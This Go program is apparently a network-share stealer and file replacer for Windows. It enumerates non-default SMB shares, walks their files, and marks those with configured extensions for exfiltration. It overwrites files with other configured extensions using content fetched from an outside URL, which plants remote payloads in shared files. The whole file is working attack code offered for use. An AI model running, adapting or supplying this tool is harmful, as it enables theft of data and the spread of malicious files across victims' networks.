package main

import (
    "fmt"
    wapi "github.com/Codehardt/go-win64api"
    "gopkg.in/ini.v1"
    "strings"
    "path/filepath"
    "os"
    "archive/zip"
    "io"
    "net/http"

)

func contains(slice []string, target string) bool {
    for _, v := range slice {
        if v == target {
            return true
        }
    }
    return false
}

func downloadFile(url, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
		return err
	}

	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Download file failed: %d", resp.StatusCode)
	}

    // overwrite existing file in path
	outFile, err := os.Create(filepath)
	if err != nil {
		return err
	}

	defer outFile.Close()
	_, err = io.Copy(outFile, resp.Body)
	if err != nil {
		return err
	}

	return nil

}

func main(){
    // Avoid collection from default fileshares
    defaultShares := []string{"IPC$", "ADMIN$", "C$", "NETLOGON", "SYSVOL"}
    // load config file with file exts to exfil & replace
    cfg, err := ini.Load("config.ini")
    if err != nil {
        fmt.Println(err)
    }
    // slice of file exts to exfil
    stealExts := strings.Split(cfg.Section("stealer").Key("extensions").String(), ",")
    replaceExts := make(map[string]string)
    
    for _, key := range cfg.Section("replacer").Keys() {
        replaceExts[key.Name()] = key.String()
    }

    shareInfo := make(map[string][]string)
    pr, _ := wapi.ListNetworkShares()
    for _, p := range pr {
        // Avoid adding default shares for enumeration
        if contains(defaultShares, p.Name) != true {
            shareInfo["Name"] = append(shareInfo["Name"], p.Name)
            shareInfo["Path"] = append(shareInfo["Path"], p.Path)
        }
    }


    targetFiles := []string{}
    for key, slice := range shareInfo {
        if key == "Path" {
            for _, item := range slice {
                err := filepath.WalkDir(item, func(path string, d os.DirEntry, err error) error {
                    if err != nil {
                        fmt.Println(err)
                    }
                    if d.IsDir() != true {
                        // Check if filename has an extension that's of interest to us
                        extension := strings.Split(d.Name(), ".")
                        if contains(stealExts, extension[len(extension)-1]) {
                            // Adding all files of interest to exfil to targetFiles
                            targetFiles = append(targetFiles, path)
        		    	} 
                        // iterate over replace mapping to see if we should replace the file based on the extension
                        for targetExt, replacePath := range replaceExts {
                            if targetExt == extension[len(extension)-1] {
                                fmt.Println("[+] Extension found for file to replace: ", path)
                                if strings.HasPrefix(replacePath, "http") {
                                    downloadFile(replacePath, path)
                                }
                            }
                        }

                    }
                    return nil
                })
                if err != nil {
                    fmt.Println(err)
                }
            }
        }


    }

    fmt.Println("[+] Target files to collect: ", targetFiles)

}
